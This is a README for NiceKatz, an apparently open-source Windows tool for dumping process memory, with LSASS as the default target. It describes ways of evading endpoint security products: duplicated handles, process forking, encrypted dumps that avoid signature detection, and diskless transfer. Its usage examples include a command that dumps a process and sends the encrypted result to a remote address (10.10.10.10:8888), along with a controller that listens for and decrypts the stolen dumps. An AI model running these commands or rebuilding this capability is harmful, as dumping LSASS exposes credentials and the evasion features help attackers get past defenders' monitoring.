# NiceKatz - a nice process dumping tool

![🍉](https://cdn.emojidex.com/emoji/seal/watermelon.png "watermelon")

NiceKatz is a process dumping tool which was developed as part of my software development and windows internals studies.
This tool lets you dump the memory of windows process's in couple of different ways and avoids calling suspicious APIs. 

It is well known already that most of the modern security solutions will block any API calls such as OpenProcess that targets sensetive processes(eg. lsass.exe), other then that, direct memory reading of such processes will also flag modern security solutions. If this is not enough, there are also some vendors that detects the signature of the dump file itself, so even if the handle to the process is retrieved, and the memory reading has completed, all of the work will be thrown away once the dump file touches the disk.. 

NiceKatz evades all of the problems mentioned above, and provides more then one way to dump the processe's memory. 

## Features
- Uses handle duplication to avoid direct OpenProcess to the target
- Supports process forking to avoid direct memory reading of the target process
- Can dump ANY process, not only LSASS
- Supports two different dump modes - MiniDumpWriteDump and SilentProcessExit
- Implements MiniDumpWriteDump callback to capture MiniDump information in memory
- Supports dump encryption to avoid dmp file signatures from being detected
- Supports sending dump file remotely without touching the disk
- Cleanup is performed for any OS configuration change
- Provides a controller that can be used as a listener and a decryptor of dump files generated by NiceKatz

## Build instructions
A full visual studio solution is provided, just load it to visual studio and build.
The right build to use is "Release x64". Do not build as x86, it is not supported by this tool.
The build will result in two files - NiceKatz.exe and NiceKatzController.exe

## NiceKatz
This is is the program that performs the actual process dumping, you can use it to dump any process, in two different modes. 
You can use  this program to dump processes, encrypt the dumped process, send it remotlely or write it to disk.  
#### NiceKatz usage:
```
NiceKatz v0.1
        Alon Leviev(@0xDeku)

Mandatory args:
-m Process dump method
        1 = Dump target process by using MiniDumpWriteDump
        2 = Dump target process by using SilentProcessExit(Does not support -r and -e ATM)

Other args:
-e Encrypt output file
-r Send dmp remotly without touching the disk
        <IP_ADDR> The ip address to send the dump to
        <PORT> The port of which to connect to
-p Target process id to dump(Default: LSASS pid)

Examples:
- Dump lsass by using MiniDumpWriteDump and ecrypt the output file:
        NiceKatz.exe -m 1 -e
- Dump PID 1234 by using SilentProcessExit method:
        NiceKatz.exe -m 2 -p 1234
- Dump PID 5678 by using MiniDumpWriteDump, encrypt the dump in memory and send remotly:
        NiceKatz.exe -m 1 -p 5678 -r 10.10.10.10:8888 -e
```

## NiceKatzController
This is the program which you can use to listen for connections arriving from NiceKatz.exe. 
The controller has more capabilities such as: decrypting the process dump stream recived from the socket as well as decrypting a given file genereated by NiceKatz.exe

#### NiceKatzController usage:
```
NiceKatzController
        Alon Leviev(@0xDeku)

Arguments:
-l Listen for connections from remote target machine
-d Decrypt the dump file when recived from the target
-df Decrypt an encrypted dump file by path(Not supported with other arguments)

Examples:
- Listen for connections from remote target and decrypt the recived dump file:
        NiceKatzController.exe -l -d
- Decrypt an encrypted dump file by its path:
        NiceKatzController.exe -df C:\Temp\dump.dmp
```

## Demo


https://user-images.githubusercontent.com/93016131/178570364-701c0649-b178-414e-af96-fc871899b1ec.mp4



## Future development
There is a list of TODOs and I will continue developing this tool in the future.
If you encounter a bug, or want to ask for aditional features, just open an issue on this git repo. 

## Credits 
Rasta mouse
MalsecLogon
NanoDump
Deep Inistinct

